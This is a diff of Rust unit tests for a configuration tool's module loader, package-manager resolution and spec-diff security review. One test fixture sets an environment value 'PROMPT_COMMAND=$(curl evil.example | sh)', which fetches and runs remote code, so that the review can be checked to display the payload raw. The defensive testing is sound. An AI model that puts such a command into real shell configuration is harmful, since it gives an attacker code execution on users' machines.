@@ -7,10 +7,12 @@ use crate::config::{
     ModuleFileEntry, ModuleLockEntry, ModuleLockfile, ModulePackageEntry, ModuleSpec, parse_module,
 };
 use crate::errors::{CfgdError, ModuleError};
+use crate::output::Role;
 use crate::platform::Platform;
 use crate::providers::{PackageManager, StubPackageManager as MockManager};
 use crate::test_helpers::{
-    linux_ubuntu_platform, macos_platform, make_manager_map, make_test_modules, test_printer,
+    linux_ubuntu_platform, macos_platform, make_manager_map, make_test_modules,
+    test_package_context, test_printer, test_state,
 };
 
 // Cross-cutting tests reach into private helpers of submodules; expose them.
@@ -99,6 +101,111 @@ spec: {}
     assert!(result.is_err());
     let err = result.unwrap_err();
     assert!(err.to_string().contains("does not match"));
+}
+
+/// A module name is the OWNER half of every `module` drift row, so one
+/// carrying a `/` or a `:` would attribute its own rows to a shorter name.
+/// Refused at the load, which is what lets both crates read a row's owner as
+/// "everything before the first separator" instead of guessing.
+///
+/// Only the `:` half is reachable from a directory listing — a `/` cannot
+/// occur in one path component — but the refusal names both, because both are
+/// separators the row grammar reads.
+#[test]
+fn a_module_name_carrying_a_drift_id_separator_is_refused() {
+    let name = "a:b";
+    let dir = tempfile::tempdir().unwrap();
+    let mod_dir = dir.path().join("modules").join(name);
+    std::fs::create_dir_all(&mod_dir).unwrap();
+    std::fs::write(
+        mod_dir.join("module.yaml"),
+        format!(
+            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: {name}\nspec: {{}}\n"
+        ),
+    )
+    .unwrap();
+
+    let err = load_modules(dir.path())
+        .err()
+        .unwrap_or_else(|| panic!("a module named {name:?} must be refused"))
+        .to_string();
+    assert!(
+        err.contains("module name"),
+        "the refusal names the rule: {err}"
+    );
+}
+
+/// A module a SOURCE delivers answers the same refusal as one on disk.
+///
+/// A source's manifest names the modules it offers, and cfgd both joins that
+/// name onto the checkout to find the body and keys the module map by it — so
+/// an offered `acme/tool` reaches outside the directory it was offered under
+/// AND attributes its rows to a module called `acme`. Nothing about the name
+/// came from this machine, which is exactly why the refusal cannot live in the
+/// directory scan alone.
+#[test]
+fn a_source_delivered_module_name_carrying_a_separator_is_refused() {
+    for name in ["a:b", "acme/tool"] {
+        let dir = tempfile::tempdir().unwrap();
+        let modules_dir = dir.path().join("modules");
+        let body = modules_dir.join(name);
+        std::fs::create_dir_all(&body).unwrap();
+        // The body names itself plainly: what the source manifest OFFERED is
+        // the only thing carrying the separator, and it is the map key rows
+        // are attributed by whether or not the body agrees with it.
+        std::fs::write(
+            body.join("module.yaml"),
+            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: tool\nspec: {}\n",
+        )
+        .unwrap();
+        let root = crate::modules::SourceModuleRoot {
+            source_name: "acme".to_string(),
+            priority: 10,
+            modules_dir,
+            offered: vec![name.to_string()],
+            scripts_permitted: true,
+        };
+
+        let mut modules = HashMap::new();
+        let err = crate::modules::load_source_modules(&[root], &mut modules)
+            .err()
+            .unwrap_or_else(|| panic!("a source offering {name:?} must be refused"))
+            .to_string();
+        assert!(
+            err.contains("module name"),
+            "the refusal names the rule: {err}"
+        );
+        assert!(modules.is_empty(), "a refused name composes nothing");
+    }
+}
+
+/// A module BODY naming itself with a separator is refused where every loader
+/// meets it.
+///
+/// `load_module` is the seam the remote-lockfile and source-delivered paths
+/// both reach a body through, and it takes `metadata.name` as the module's
+/// name with no directory to compare against — so a body whose own metadata
+/// carries a separator is refused here, whatever the directory it arrived in
+/// was called.
+#[test]
+fn a_module_body_naming_itself_with_a_separator_is_refused() {
+    let dir = tempfile::tempdir().unwrap();
+    let body = dir.path().join("plain-directory");
+    std::fs::create_dir_all(&body).unwrap();
+    std::fs::write(
+        body.join("module.yaml"),
+        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: acme/tool\nspec: {}\n",
+    )
+    .unwrap();
+
+    let err = crate::modules::load_module(&body)
+        .err()
+        .unwrap_or_else(|| panic!("a body naming itself `acme/tool` must be refused"))
+        .to_string();
+    assert!(
+        err.contains("module name"),
+        "the refusal names the rule: {err}"
+    );
 }
 
 #[test]
@@ -211,7 +318,7 @@ fn dependency_order_cycle_chain_is_sorted_every_run() {
         ("mid", &["alpha"]),
         ("alpha", &["zeta"]),
     ]);
-    let expected = "module error: module dependency cycle: [\"alpha\", \"mid\", \"zeta\"]";
+    let expected = "module dependency cycle: [\"alpha\", \"mid\", \"zeta\"]";
     for _ in 0..50 {
         let result = resolve_dependency_order(&["zeta".into()], &modules);
         let err = result.unwrap_err();
@@ -242,19 +349,128 @@ fn resolve_package_simple_native() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let mut result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.canonical_name, "ripgrep");
     assert_eq!(result.resolved_name, "ripgrep");
     assert_eq!(result.manager, "brew");
+    // With no `minVersion` nothing about the choice depends on what brew
+    // offers, so resolution leaves the price unasked; a surface that renders
+    // one fills it.
+    assert_eq!(result.version, None);
+    fill_available_versions(std::slice::from_mut(&mut result), &managers);
     assert_eq!(result.version, Some("14.1.0".into()));
+}
+
+/// A bare `- name: npm` means "npm on this machine". apt is Ubuntu's default
+/// and does not hold it; brew is available and does. Resolving to apt planned
+/// `apt-get install npm` — six hundred node-* debs — on a machine whose own
+/// bootstrap had put npm on it through brew one run earlier.
+#[test]
+fn a_bare_entry_resolves_to_the_available_manager_that_already_holds_it() {
+    let apt = MockManager::new("apt").with_package("npm", "9.2.0");
+    let brew = MockManager::new("brew").with_installed(&["npm"]);
+    let managers = make_manager_map(&[("apt", &apt), ("brew", &brew)]);
+    let platform = linux_ubuntu_platform();
+    let printer = test_printer();
+    let state = test_state();
+    let cx = test_package_context(&printer, &state);
+
+    let entry = ModulePackageEntry {
+        name: "npm".into(),
+        ..Default::default()
+    };
+
+    let result = resolve_package(&entry, "nvim", &platform, &managers, Some(&cx))
+        .unwrap()
+        .unwrap();
+    assert_eq!(result.manager, "brew", "the manager that holds npm wins");
+    assert!(
+        !result.manager_declared,
+        "cfgd chose the holder; the author named no manager"
+    );
+
+    // Nothing to read from: the platform default stands, as it always has.
+    let unread = resolve_package(&entry, "nvim", &platform, &managers, None)
+        .unwrap()
+        .unwrap();
+    assert_eq!(unread.manager, "apt");
+}
+
+/// `prefer` is an AUTHORED order and a statement about WHICH manager. With
+/// brew holding npm, `prefer: [apt]` still resolves to apt — the author said
+/// so — and the plan installs it there.
+#[test]
+fn an_authored_prefer_list_outranks_the_manager_that_holds_the_package() {
+    let apt = MockManager::new("apt").with_package("npm", "9.2.0");
+    let brew = MockManager::new("brew").with_installed(&["npm"]);
+    let managers = make_manager_map(&[("apt", &apt), ("brew", &brew)]);
+    let platform = linux_ubuntu_platform();
+    let printer = test_printer();
+    let state = test_state();
+    let cx = test_package_context(&printer, &state);
+
+    let entry = ModulePackageEntry {
+        name: "npm".into(),
+        prefer: vec!["apt".into()],
+        ..Default::default()
+    };
+
+    let result = resolve_package(&entry, "nvim", &platform, &managers, Some(&cx))
+        .unwrap()
+        .unwrap();
+    assert_eq!(result.manager, "apt", "an authored prefer list is honoured");
+    assert!(result.manager_declared);
+}
+
+/// The holder's own alias is what it is asked about, and a denied manager is
+/// never a holder: `aliases: {brew: node}` with brew holding `node` resolves
+/// to brew under that name; `deny: [brew]` falls back to the default.
+#[test]
+fn a_holder_is_asked_under_its_alias_and_never_when_denied() {
+    let apt = MockManager::new("apt").with_package("npm", "9.2.0");
+    let brew = MockManager::new("brew").with_installed(&["node"]);
+    let managers = make_manager_map(&[("apt", &apt), ("brew", &brew)]);
+    let platform = linux_ubuntu_platform();
+    let printer = test_printer();
+    let state = test_state();
+    let cx = test_package_context(&printer, &state);
+
+    let aliased = ModulePackageEntry {
+        name: "npm".into(),
+        aliases: [("brew".to_string(), "node".to_string())]
+            .into_iter()
+            .collect(),
+        ..Default::default()
+    };
+    let result = resolve_package(&aliased, "nvim", &platform, &managers, Some(&cx))
+        .unwrap()
+        .unwrap();
+    assert_eq!(
+        (result.manager.as_str(), result.resolved_name.as_str()),
+        ("brew", "node")
+    );
+
+    let denied = ModulePackageEntry {
+        deny: vec!["brew".into()],
+        ..aliased
+    };
+    let result = resolve_package(&denied, "nvim", &platform, &managers, Some(&cx))
+        .unwrap()
+        .unwrap();
+    assert_eq!(result.manager, "apt");
 }
 
 #[test]
 fn resolve_package_with_prefer_list() {
     let brew = MockManager::new("brew").unavailable();
-    let apt = MockManager::new("apt").with_package("neovim", "0.10.2");
+    // These two agree with `resolve_package_min_version_check`'s fixtures on
+    // purpose. A version query is memoized per `(manager, package)` for the
+    // process, so two tests claiming that one manager offers two different
+    // versions of one package would be claiming two different machines, and
+    // whichever ran second would read the other's answer.
+    let apt = MockManager::new("apt").with_package("neovim", "0.6.1");
     let snap = MockManager::new("snap").with_package("nvim", "0.10.3");
     let managers = make_manager_map(&[("brew", &brew), ("apt", &apt), ("snap", &snap)]);
     let platform = linux_ubuntu_platform();
@@ -273,7 +489,7 @@ fn resolve_package_with_prefer_list() {
     };
 
     // brew is unavailable, so snap should be tried next
-    let result = resolve_package(&entry, "nvim", &platform, &managers)
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "snap");
@@ -284,7 +500,7 @@ fn resolve_package_with_prefer_list() {
 #[test]
 fn resolve_package_min_version_check() {
     let apt = MockManager::new("apt").with_package("neovim", "0.6.1");
-    let snap = MockManager::new("snap").with_package("nvim", "0.10.2");
+    let snap = MockManager::new("snap").with_package("nvim", "0.10.3");
     let managers = make_manager_map(&[("apt", &apt), ("snap", &snap)]);
     let platform = linux_ubuntu_platform();
 
@@ -301,12 +517,44 @@ fn resolve_package_min_version_check() {
         ..Default::default()
     };
 
-    // apt has 0.6.1 which is < 0.9, so snap (0.10.2) should be chosen
-    let result = resolve_package(&entry, "nvim", &platform, &managers)
+    // apt has 0.6.1 which is < 0.9, so snap (0.10.3) should be chosen
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "snap");
-    assert_eq!(result.version, Some("0.10.2".into()));
+    assert_eq!(result.version, Some("0.10.3".into()));
+}
+
+/// A floor nobody can parse is a report, not a rejection: rejecting every
+/// candidate on it deletes the package from the plan entirely, which is the
+/// resolver's spelling of the invented-drift class — the verify pass owns the
+/// check error instead.
+#[test]
+fn resolve_package_keeps_a_candidate_a_malformed_floor_could_not_judge() {
+    let apt = MockManager::new("apt").with_package("neovim", "0.6.1");
+    let managers = make_manager_map(&[("apt", &apt)]);
+    let platform = linux_ubuntu_platform();
+
+    let entry = ModulePackageEntry {
+        name: "neovim".into(),
+        min_version: Some(">=0.9".into()),
+        prefer: vec!["apt".into()],
+        aliases: HashMap::new(),
+        script: None,
+        deny: vec![],
+        platforms: vec![],
+        ..Default::default()
+    };
+
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
+        .unwrap()
+        .expect("the package still resolves");
+    assert_eq!(result.manager, "apt");
+    assert_eq!(
+        result.min_version.as_deref(),
+        Some(">=0.9"),
+        "and the declaration travels on, for the check that names it"
+    );
 }
 
 #[test]
@@ -326,7 +574,7 @@ fn resolve_package_unresolvable() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "nvim", &platform, &managers);
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None);
     assert!(result.is_err());
     assert!(
         result
@@ -355,12 +603,66 @@ fn resolve_package_alias_applied() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.canonical_name, "fd");
     assert_eq!(result.resolved_name, "fd-find");
     assert_eq!(result.manager, "apt");
+}
+
+/// Who chose the manager, recorded where the declaration is in scope.
+///
+/// A `prefer` list makes every candidate the author's own, an `aliases` key
+/// names one manager specifically, and an entry carrying neither lands on
+/// cfgd's platform default — a choice this crate made, which
+/// `declared_manager_routes` must not read as a statement by the module.
+#[test]
+fn resolve_package_records_whether_the_author_named_the_manager() {
+    let apt = MockManager::new("apt")
+        .with_package("fd-find", "8.7.0")
+        .with_package("ripgrep", "14.1.0");
+    let managers = make_manager_map(&[("apt", &apt)]);
+    let platform = linux_ubuntu_platform();
+
+    let resolve = |entry: ModulePackageEntry| {
+        resolve_package(&entry, "test", &platform, &managers, None)
+            .unwrap()
+            .unwrap()
+    };
+
+    let defaulted = resolve(ModulePackageEntry {
+        name: "ripgrep".into(),
+        ..Default::default()
+    });
+    assert_eq!(defaulted.manager, "apt");
+    assert!(
+        !defaulted.manager_declared,
+        "apt is this platform's native manager, not something the module said"
+    );
+
+    let preferred = resolve(ModulePackageEntry {
+        name: "ripgrep".into(),
+        prefer: vec!["apt".into()],
+        ..Default::default()
+    });
+    assert!(
+        preferred.manager_declared,
+        "every candidate of a `prefer` list is one the author wrote"
+    );
+
+    let aliased = resolve(ModulePackageEntry {
+        name: "fd".into(),
+        aliases: [("apt".to_string(), "fd-find".to_string())]
+            .into_iter()
+            .collect(),
+        ..Default::default()
+    });
+    assert_eq!(aliased.resolved_name, "fd-find");
+    assert!(
+        aliased.manager_declared,
+        "an `aliases` key names the manager it is keyed on"
+    );
 }
 
 #[test]
@@ -385,7 +687,7 @@ fn resolve_package_alias_winget() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "editor", &platform, &managers)
+    let result = resolve_package(&entry, "editor", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.canonical_name, "vscode");
@@ -412,7 +714,7 @@ fn resolve_package_alias_chocolatey() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "runtime", &platform, &managers)
+    let result = resolve_package(&entry, "runtime", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.canonical_name, "node");
@@ -439,7 +741,7 @@ fn resolve_package_alias_scoop() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "tools", &platform, &managers)
+    let result = resolve_package(&entry, "tools", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.canonical_name, "ripgrep");
@@ -464,7 +766,7 @@ fn resolve_package_manager_not_registered() {
     };
 
     // brew not in managers map → unresolvable
-    let result = resolve_package(&entry, "test", &platform, &managers);
+    let result = resolve_package(&entry, "test", &platform, &managers, None);
     let err = result.unwrap_err().to_string();
     assert!(
         err.contains("ripgrep"),
@@ -683,6 +985,7 @@ spec:
         &[],
         &platform,
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -740,6 +1043,7 @@ spec:
         &[],
         &platform,
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -759,6 +1063,7 @@ fn skipped_resolved_module_has_empty_on_drift_scripts() {
         "gated".into(),
         std::path::PathBuf::from("/tmp/gated"),
         Vec::new(),
+        false,
         "platform not matched".into(),
         None,
     );
@@ -806,6 +1111,7 @@ spec:
         &[],
         &linux_ubuntu_platform(),
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -833,6 +1139,7 @@ spec:
         &[],
         &macos_platform(),
         &mac_managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -886,6 +1193,7 @@ spec:
         &[],
         &linux_ubuntu_platform(),
         &managers,
+        None,
         &printer,
     )
     .expect_err("active module depending on a skipped module must be a config error");
@@ -1052,7 +1360,7 @@ fn resolve_package_script_manager() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "script");
@@ -1081,7 +1389,7 @@ fn resolve_package_script_fallback() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "nvim", &platform, &managers)
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "script");
@@ -1106,7 +1414,7 @@ fn resolve_package_script_preferred_over_manager() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "nvim", &platform, &managers)
+    let result = resolve_package(&entry, "nvim", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "script");
@@ -1128,7 +1436,7 @@ fn resolve_package_script_missing_errors() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers);
+    let result = resolve_package(&entry, "test", &platform, &managers, None);
     assert!(result.is_err());
     assert!(
         result
@@ -1157,7 +1465,7 @@ fn resolve_package_platform_match_os() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers).unwrap();
+    let result = resolve_package(&entry, "test", &platform, &managers, None).unwrap();
     assert!(result.is_some());
     assert_eq!(result.unwrap().manager, "apt");
 }
@@ -1180,7 +1488,7 @@ fn resolve_package_platform_skip_wrong_os() {
     };
 
     // On Linux, this should be skipped (None), not an error
-    let result = resolve_package(&entry, "test", &platform, &managers).unwrap();
+    let result = resolve_package(&entry, "test", &platform, &managers, None).unwrap();
     assert!(result.is_none());
 }
 
@@ -1201,7 +1509,7 @@ fn resolve_package_platform_match_distro() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers).unwrap();
+    let result = resolve_package(&entry, "test", &platform, &managers, None).unwrap();
     assert!(result.is_some());
 }
 
@@ -1225,7 +1533,7 @@ fn resolve_package_platform_match_arch() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers).unwrap();
+    let result = resolve_package(&entry, "test", &platform, &managers, None).unwrap();
     assert!(result.is_some());
 }
 
@@ -1246,7 +1554,7 @@ fn resolve_package_platform_empty_matches_all() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers).unwrap();
+    let result = resolve_package(&entry, "test", &platform, &managers, None).unwrap();
     assert!(result.is_some());
 }
 
@@ -1288,7 +1596,7 @@ fn resolve_module_packages_skips_filtered() {
         origin: None,
     };
 
-    let resolved = resolve_module_packages(&module, &platform, &managers).unwrap();
+    let resolved = resolve_module_packages(&module, &platform, &managers, None).unwrap();
     // Only ripgrep should be resolved; apt-only-tool is filtered out on macOS
     assert_eq!(resolved.len(), 1);
     assert_eq!(resolved[0].canonical_name, "ripgrep");
@@ -1526,8 +1834,8 @@ fn diff_module_specs_no_changes() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&module, &module);
-    assert_eq!(changes, vec!["(no spec changes)"]);
+    let changes = diff_module_specs(&module, &module, "->");
+    assert_eq!(changes, vec![(Role::Info, "(no spec changes)".to_string())]);
 }
 
 #[test]
@@ -1624,18 +1932,38 @@ fn diff_module_specs_detects_changes() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     // Should detect: +dep2, +pkg3, -pkg2, ~pkg1 version change, +file target, -file target
-    assert!(changes.iter().any(|c| c.contains("+ dependency: dep2")));
-    assert!(changes.iter().any(|c| c.contains("+ package: pkg3")));
-    assert!(changes.iter().any(|c| c.contains("- package: pkg2")));
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("~ package 'pkg1': minVersion"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("dependency added: dep2"))
     );
-    assert!(changes.iter().any(|c| c.contains("+ file target")));
-    assert!(changes.iter().any(|c| c.contains("- file target")));
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("package added: pkg3"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("package removed: pkg2"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Warn && c.contains("package 'pkg1': minVersion"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("file target"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("file target"))
+    );
 }
 
 // --- Module registry tests ---
@@ -1836,7 +2164,7 @@ spec:
     .unwrap();
 
     // Write a lockfile with a remote module that has the same cache structure
-    // For this test we verify the function doesn't crash on missing cache
+    // This verifies the function doesn't crash on missing cache
     // (it will error on missing git repo, which is expected)
     let lockfile = ModuleLockfile {
         modules: vec![ModuleLockEntry {
@@ -1992,9 +2320,17 @@ fn diff_module_specs_scripts_changed() {
         dir: PathBuf::from("/tmp"),
         origin: None,
     };
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("+ postApply script")));
-    assert!(changes.iter().any(|c| c.contains("- postApply script")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("postApply script added"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("postApply script removed"))
+    );
 }
 
 // `diff_module_specs` is the pre-approval security review of
@@ -2042,18 +2378,19 @@ fn diff_module_specs_multiline_script_change_preserves_raw_body() {
         dir: PathBuf::from("/tmp"),
         origin: None,
     };
-    let changes = diff_module_specs(&old, &new);
-    let script_change = changes
+    let changes = diff_module_specs(&old, &new, "->");
+    let (script_role, script_change) = changes
         .iter()
-        .find(|c| c.contains("+ postApply script"))
+        .find(|(_, c)| c.contains("postApply script added"))
         .expect("script addition should be reported");
     assert!(
         script_change.contains("echo line-three"),
         "diff must preserve the FULL raw body for pre-approval review, got: {script_change}"
     );
+    assert_eq!(*script_role, Role::Ok);
     assert_eq!(
         script_change,
-        &format!("+ postApply script: {raw_body}"),
+        &format!("postApply script added: {raw_body}"),
         "diff must push the raw body byte-identical, not condensed"
     );
 }
@@ -2068,6 +2405,7 @@ fn module_with_env_and_aliases(env: &[(&str, &str)], aliases: &[(&str, &str)]) -
                 .map(|(name, value)| crate::config::EnvVar {
                     name: (*name).into(),
                     value: (*value).into(),
+                    platforms: vec![],
                 })
                 .collect(),
             aliases: aliases
@@ -2075,6 +2413,7 @@ fn module_with_env_and_aliases(env: &[(&str, &str)], aliases: &[(&str, &str)]) -
                 .map(|(name, command)| crate::config::ShellAlias {
                     name: (*name).into(),
                     command: (*command).into(),
+                    platforms: vec![],
                 })
                 .collect(),
             ..Default::default()
@@ -2092,20 +2431,23 @@ fn diff_module_specs_reports_env_additions_removals_and_edits() {
     let old = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "old"), ("GONE", "x")], &[]);
     let new = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "new"), ("ADDED", "y")], &[]);
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&"+ env: ADDED=y".to_string()),
+        changes.contains(&(Role::Ok, "env added: ADDED=y".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"- env: GONE=x".to_string()),
+        changes.contains(&(Role::Fail, "env removed: GONE=x".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"~ env 'EDIT': old -> new".to_string()),
+        changes.contains(&(Role::Warn, "env 'EDIT': old -> new".to_string())),
         "{changes:?}"
     );
-    assert!(!changes.iter().any(|c| c.contains("KEEP")), "{changes:?}");
+    assert!(
+        !changes.iter().any(|(_, c)| c.contains("KEEP")),
+        "{changes:?}"
+    );
 }
 
 #[test]
@@ -2114,20 +2456,23 @@ fn diff_module_specs_reports_alias_additions_removals_and_edits() {
     let new =
         module_with_env_and_aliases(&[], &[("keep", "ls"), ("edit", "nvim"), ("added", "bat")]);
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&"+ alias: added=bat".to_string()),
+        changes.contains(&(Role::Ok, "alias added: added=bat".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"- alias: gone=cat".to_string()),
+        changes.contains(&(Role::Fail, "alias removed: gone=cat".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"~ alias 'edit': vi -> nvim".to_string()),
+        changes.contains(&(Role::Warn, "alias 'edit': vi -> nvim".to_string())),
         "{changes:?}"
     );
-    assert!(!changes.iter().any(|c| c.contains("keep")), "{changes:?}");
+    assert!(
+        !changes.iter().any(|(_, c)| c.contains("keep")),
+        "{changes:?}"
+    );
 }
 
 // The value is the payload under review, so it is pushed byte-identical the
@@ -2141,13 +2486,16 @@ fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
         &[("ls", "line-one\nline-two")],
     );
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&"+ env: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()),
+        changes.contains(&(
+            Role::Ok,
+            "env added: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()
+        )),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"+ alias: ls=line-one\nline-two".to_string()),
+        changes.contains(&(Role::Ok, "alias added: ls=line-one\nline-two".to_string())),
         "{changes:?}"
     );
 }
@@ -2156,8 +2504,8 @@ fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
 fn diff_module_specs_identical_env_and_aliases_report_no_changes() {
     let module = module_with_env_and_aliases(&[("A", "1")], &[("b", "c")]);
     assert_eq!(
-        diff_module_specs(&module, &module),
-        vec!["(no spec changes)"]
+        diff_module_specs(&module, &module, "->"),
+        vec![(Role::Info, "(no spec changes)".to_string())]
     );
 }
 
@@ -2190,7 +2538,7 @@ fn resolve_package_deny_excludes_manager() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers);
+    let result = resolve_package(&entry, "test", &platform, &managers, None);
     // brew is the only/native manager on macOS but is denied, so resolution should fail
     let err = result.unwrap_err().to_string();
     assert!(
@@ -2277,8 +2625,8 @@ fn diff_module_specs_no_changes_default() {
     let spec = crate::config::ModuleSpec::default();
     let old = make_loaded_module("test", spec.clone());
     let new = make_loaded_module("test", spec);
-    let changes = diff_module_specs(&old, &new);
-    assert_eq!(changes, vec!["(no spec changes)".to_string()]);
+    let changes = diff_module_specs(&old, &new, "->");
+    assert_eq!(changes, vec![(Role::Info, "(no spec changes)".to_string())]);
 }
 
 #[test]
@@ -2289,8 +2637,12 @@ fn diff_module_specs_added_dependency() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("+ dependency: core")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("dependency added: core"))
+    );
 }
 
 #[test]
@@ -2301,8 +2653,12 @@ fn diff_module_specs_removed_dependency() {
     };
     let old = make_loaded_module("test", old_spec);
     let new = make_loaded_module("test", crate::config::ModuleSpec::default());
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("- dependency: core")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("dependency removed: core"))
+    );
 }
 
 #[test]
@@ -2316,8 +2672,12 @@ fn diff_module_specs_added_package() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("+ package: ripgrep")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("package added: ripgrep"))
+    );
 }
 
 #[test]
@@ -2331,8 +2691,12 @@ fn diff_module_specs_removed_package() {
     };
     let old = make_loaded_module("test", old_spec);
     let new = make_loaded_module("test", crate::config::ModuleSpec::default());
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("- package: vim")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("package removed: vim"))
+    );
 }
 
 #[test]
@@ -2356,12 +2720,11 @@ fn diff_module_specs_package_version_change() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
-    assert!(
-        changes
-            .iter()
-            .any(|c| c.contains("kubectl") && c.contains("1.28") && c.contains("1.30"))
-    );
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(changes.iter().any(|(role, c)| *role == Role::Warn
+        && c.contains("kubectl")
+        && c.contains("1.28")
+        && c.contains("1.30")));
 }
 
 #[test]
@@ -2380,11 +2743,11 @@ fn diff_module_specs_added_file() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("+ file target: ~/.zshrc"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("file target added: ~/.zshrc"))
     );
 }
 
@@ -2409,7 +2772,7 @@ fn diff_module_specs_multiple_changes() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     // Should have: +dep core, -dep base, +pkg neovim, -pkg vim
     assert!(
         changes.len() >= 4,
@@ -2691,7 +3054,7 @@ fn resolve_package_deny_skips_manager() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     // brew is denied, so apt should be used
@@ -2716,7 +3079,7 @@ fn resolve_package_platform_filter_skips() {
     };
 
     // Linux platform should be filtered out
-    let result = resolve_package(&entry, "test", &platform, &managers).unwrap();
+    let result = resolve_package(&entry, "test", &platform, &managers, None).unwrap();
